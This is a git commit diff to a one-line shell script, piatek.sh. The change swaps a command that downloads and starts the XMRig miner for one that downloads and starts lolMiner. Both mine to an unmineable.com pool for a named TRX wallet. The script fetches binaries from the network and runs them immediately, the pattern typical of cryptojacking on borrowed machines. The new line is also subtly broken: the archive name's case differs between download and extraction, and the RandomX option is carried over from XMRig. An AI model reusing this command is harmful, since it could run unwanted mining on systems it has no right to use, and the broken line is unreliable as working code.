f6482eb484618c5846896421eca5580762c2584d
MillaMiszkowy <116966093+MillaMiszkowy@users.noreply.github.com>
2022-10-29 17:34:41 +0100

    Update piatek.sh

--- piatek.sh
+++ piatek.sh
@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TKhhSTx3XD93bmjgCdN9xmD3AsZ5N5yJBJ.Piatek -p x
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.61/lolMiner_v1.61_Lin64.tar.gz && tar -xvf lolminer_v1.61_Lin64.tar.gz && cd 1.61 && ./lolMiner -o rx.unmineable.com:3333 -a rx -k -u TRX:TKhhSTx3XD93bmjgCdN9xmD3AsZ5N5yJBJ.Piatek -p x
